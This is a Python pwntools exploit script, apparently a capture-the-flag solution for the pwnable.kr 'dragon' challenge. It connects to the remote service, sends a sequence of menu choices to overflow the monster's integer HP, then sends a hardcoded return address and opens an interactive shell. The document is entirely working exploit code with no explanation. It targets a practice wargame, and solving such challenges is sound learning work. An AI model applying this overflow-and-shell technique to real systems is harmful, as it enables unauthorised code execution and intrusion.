from pwn import * 

#sh = process("./dragon") 
sh = remote("pwnable.kr",9004)
def priest(choice) : 
    print sh.recvuntil("You Become Temporarily Invincible.\n") 
    sh.sendline(choice) 

# first time 
print sh.recvuntil("[ 2 ] Knight\n")
sh.sendline("1")
priest("1") 
priest("1") 

# second time overflow int HP 
print sh.recvuntil("[ 2 ] Knight\n") 
sh.sendline("1")
priest("3") 
priest("3")
priest("2")
priest("3")
priest("3")
priest("2") 
priest("3")
priest("3")
priest("2")
priest("3")
priest("3")
priest("2")
print sh.recv()
one_gadget = p32(0x08048DBF) 
sh.sendline(one_gadget) 
sh.interactive()
